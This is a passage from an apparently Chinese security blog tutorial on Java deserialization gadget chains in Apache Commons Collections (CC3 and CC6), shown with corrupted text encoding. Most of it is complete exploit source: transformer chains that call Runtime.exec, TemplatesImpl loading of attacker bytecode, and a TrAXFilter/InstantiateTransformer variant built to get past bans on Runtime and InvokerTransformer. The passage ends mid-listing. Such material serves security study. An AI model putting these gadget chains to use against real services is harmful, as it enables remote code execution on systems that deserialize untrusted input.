org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6TiedMapEntry2</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CC6TiedMapEntry2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry2.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        templatesClass.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿæ˜¯æˆåŠŸåŠ è½½</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801140609456.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801140609456.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="é“¾æ¥åˆ°readObject"><a href="#é“¾æ¥åˆ°readObject" class="headerlink" title="é“¾æ¥åˆ°readObject"></a>é“¾æ¥åˆ°readObject</h2><h3 id="ç›´æ¥è§¦å‘TemplatesImpl-newTransformer"><a href="#ç›´æ¥è§¦å‘TemplatesImpl-newTransformer" class="headerlink" title="ç›´æ¥è§¦å‘TemplatesImpl#newTransformer"></a>ç›´æ¥è§¦å‘TemplatesImpl#newTransformer</h3><p>InvokerTransformerèƒ½è°ƒç”¨ä»»æ„å…¬å¼€çš„æ–¹æ³•ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯newTransformerã€‚ç›´æ¥åœ¨åé¢é“¾ä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templatesClass),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>åé¢éšä¾¿æˆªå–ä¸€æ®µå…¶ä»–CCçš„ä»£ç æ¥ç€è§¦å‘chainedTransformerå°±è¡Œäº†ã€‚è¿™é‡Œå°±ç”¨CC6åé¢çš„ä»£ç .</p><p>å®Œæ•´ä»£ç 1ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\CC6TiedMapEntry2.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templatesClass),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;godown&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        map.remove(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">lazymapClass</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazymapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(factory, factory.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        factory.set(lazyMap, chainedTransformer);</span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;cc6.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·Runtimeè¢«banäº†ä¹Ÿèƒ½æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”åŠ è½½å­—èŠ‚ç çš„åç»­åˆ©ç”¨èŒƒå›´ä¹Ÿæ›´å¤šã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801173716026.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801173716026.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£InvokerTransformerä¹Ÿè¢«banäº†å‘¢ï¼Ÿ</p><h3 id="InstantiateTransformerè§¦å‘TrAXFilteræ„é€ å™¨"><a href="#InstantiateTransformerè§¦å‘TrAXFilteræ„é€ å™¨" class="headerlink" title="InstantiateTransformerè§¦å‘TrAXFilteræ„é€ å™¨"></a>InstantiateTransformerè§¦å‘TrAXFilteræ„é€ å™¨</h3><p>ç›´æ¥è§¦å‘newTransformerçš„å¦‚å›¾ï¼ŒProcessæ˜¯åœ¨mainé‡Œï¼Œæ²¡åŠæ³•ç”¨ã€‚</p><p>getOutputProperitiesä½œä¸ºä¸€ä¸ªgetteræ–¹æ³•ï¼Œåœ¨åé¢çš„CC11å’Œfastjsonä¸­ä¼šç”¨åˆ°ã€‚å…ˆç•¥è¿‡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801162850297.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801162850297.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>TranformerFactoryImplåŠå…¶çˆ¶ç±»éƒ½æ²¡æœ‰ç»§æ‰¿serializableæ¥å£ï¼Œè™½ç„¶æ²¡æœ‰ç»§æ‰¿serializableçš„ä¸€äº›ç±»ä¾ç„¶æœ‰åŠæ³•åœ¨ååºåˆ—åŒ–è·å–å®ä¾‹ï¼Œæ¯”å¦‚æˆ‘ä»¬å‰é¢çš„chainedTransformerï¼Œå®é™…ä¸Šæ•´ä¸ªåºåˆ—åŒ–è¿‡ç¨‹éƒ½æ²¡æœ‰ç”¨åˆ°Runtimeçš„å®ä¾‹ï¼Œåˆ›å»ºå®ä¾‹çš„è¿‡ç¨‹å‘ç”Ÿåœ¨ååºåˆ—åŒ–é€”ä¸­ã€‚ä½†è¿™ç§æ–¹å¼è¦æ±‚<code>æ„é€ å‡½æ•°</code>æˆ–è€…<code>è·å–å®ä¾‹çš„æ–¹æ³•</code>èƒ½ä¼ è¿›éœ€è¦çš„å‚æ•°ï¼Œå› ä¸ºé“¾å¼çš„è¿‡ç¨‹ä¸­æ— æ³•å†å»åå°„ä¿®æ”¹å®ä¾‹çš„å­—æ®µã€‚ä½ çœ‹æˆ‘ä»¬åå°„ä¿®æ”¹éƒ½æ˜¯åœ¨åºåˆ—åŒ–å¯¹è±¡ä¸Šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åšä¸ªå°æ€»ç»“ï¼Œç›®å‰èƒ½è°ƒç”¨ä½¿ç”¨éserializableç±»çš„åœ°æ–¹åªæœ‰InvokerTransformerçš„é“¾å¼è°ƒç”¨ä¸­ã€‚</p></blockquote><p>æˆ‘ä»¬çœ‹TranformFactoryImplï¼Œéœ€è¦æŒ‡å®štemplatesä¸ºä¸Šæ–‡ç”Ÿæˆçš„templatesClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801171206983.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801171206983.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£æœ‰æ²¡æœ‰è·å–å®ä¾‹çš„åœ°æ–¹æˆ–è€…æ„é€ å‡½æ•°èƒ½ä¿®æ”¹templateså‘¢ï¼Œç­”æ¡ˆæ˜¯æ²¡æœ‰</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801171345478.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801171345478.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥è¿™ä¸ªç±»ä¸èƒ½ç”¨ã€‚</p><p>æœ€åæˆ‘ä»¬çœ‹TrAXFilterç±»ï¼Œè™½ç„¶è¯¥ç±»æ²¡æœ‰ç»§æ‰¿serializableï¼Œåœ¨æ„é€ å‡½æ•°ä¸­å°±ç»™templatesèµ‹å€¼ï¼Œå¹¶è°ƒç”¨äº†newTransformer()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801173904154.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801173904154.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ€ä¹ˆè§¦å‘æ„é€ å‡½æ•°å‘¢ï¼Ÿ</p><p>æœ¬é“¾å®˜æ–¹ç»™å‡ºäº†InstantiateTransformerç±»ï¼Œè¯¥ç±»çš„transformè·å–æ„é€ å™¨ï¼Œå¹¶newInstance()ï¼Œç­‰äºè°ƒç”¨äº†æ„é€ å‡½æ•°ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801174100867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801174100867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ„é€ å‡½æ•°ä¼ è¿›å»è°ƒç”¨æŒ‡å®šæ„é€ å™¨</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801174410156.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801174410156.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesClass&#125;),</span><br><span class="line">&#125;;       </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801175725066.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240801175725066.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è½»æ¾æ‹¿ä¸‹</p><p>å®Œæ•´ä»£ç 2ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 